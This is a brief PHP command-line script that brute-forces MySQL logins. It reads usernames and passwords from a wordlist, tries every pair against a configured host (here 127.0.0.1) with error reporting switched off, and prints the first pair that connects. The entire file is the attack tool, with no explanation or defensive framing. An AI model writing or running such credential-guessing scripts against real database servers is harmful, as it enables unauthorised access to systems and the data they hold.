#!/usr/bin/env php
<?php
error_reporting(0);
$host = "127.0.0.1";

$user_dict = "wordlist.txt";
$pass_dict = "wordlist.txt";

$userFile = file($user_dict);
$passFile = file($pass_dict);

$success;
foreach ($userFile as $user) {
    if ($success == 1) {
        break;
    }
    foreach ($passFile as $pass) {
        $user = trim($user);
        $pass = trim($pass);
        $connection = mysql_connect($host, $user, $pass);
        if ($connection) {
            echo "success:" . $user . ":" . $pass . "\n";
            $success = 1;
            mysql_close($connection);
            break;
        }
    }
}
?>
